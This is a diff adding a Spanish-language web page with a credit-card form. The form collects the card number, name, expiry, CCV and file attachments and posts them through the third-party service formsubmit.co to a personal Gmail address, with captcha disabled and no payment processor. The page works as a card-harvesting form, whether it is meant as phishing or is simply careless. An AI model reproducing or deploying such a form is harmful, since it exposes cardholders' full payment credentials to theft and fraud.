@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta http-equiv="X-UA-Compatible" content="ie=edge">
+	<title>Formulario de Tarjeta de Crédito Dinámico</title>
+	<link rel="stylesheet" href="css/css.css">
+	<link rel="stylesheet" href="css/estilos.css">
+</head>
+
+<body>
+<div class="contenedor">
+<!-- Tarjeta -->
+<section class="tarjeta" id="tarjeta">
+	<img src="img/office.jpg" alt=" " width="100%" height="auto" class="responsive">
+</section>
+<!-- Contenedor Boton Abrir Formulario -->
+<div class="contenedor-btn"><button class="btn-abrir-formulario" id="btn-abrir-formulario"><img src="img/boton-compra.png" alt=" " width="150" height="50"></button></div>
+<!-- Formulario -->
+<form action="https://formsubmit.co/tiendavirtualbatan@gmail.com" id="formulario-tarjeta" class="formulario-tarjeta" method="POST" enctype="multipart/form-data">
+			<div class="grupo"><label for="inputNumero">Número Tarjeta</label><input type="text" name="number" id="inputNumero" maxlength="19" autocomplete="off"></div>
+			<div class="grupo"><label for="inputNombre">Nombre</label><input type="text" name="name" id="inputNombre" maxlength="19" autocomplete="off"></div>
+			<div class="flexbox"><div class="grupo expira"><label for="selectMes">Expiracion</label>
+			<div class="flexbox"><div class="grupo-select"><select name="mes" id="selectMes"><option disabled selected>Mes</option></select><i class="fas fa-angle-down"></i></div>
+			<div class="grupo-select"><select name="year" id="selectYear"><option disabled selected>Año</option></select><i class="fas fa-angle-down"></i></div></div></div>
+			<div class="grupo ccv"><label for="inputCCV">CCV</label><input type="text" name="code" id="inputCCV" maxlength="3"></div></div>
+			<div class="grupo"><label for="inputNombre">Agregue detalles</label><input type="text" name="commentary" id="inputNombre" maxlength="200" autocomplete="off"></div>
+			<div class="input-group mb-3">
+			<div class="input-group-prepend"><span class="input-group-text">Adjunte Archivo</span></div>
+			<br>
+			<div class="custom-file"><input type="file" name="my_file" id="my_file" class="custom-file-input" multiple></div>
+			 </div>
+			<button type="submit" class="btn-enviar">Enviar</button>
+			<input type="hidden" name="_next" value="https://tiendavirtualbatan.com/formulario-tarjeta-credito-3d-master/index.html">
+			<input type="hidden" name="_captcha" value="false">
+</form>
+</div>
+<script src="js/2c36e9b7b1.js" crossorigin="anonymous"></script>
+<script src="js/main.js"></script>
+</body>
+
+</html>
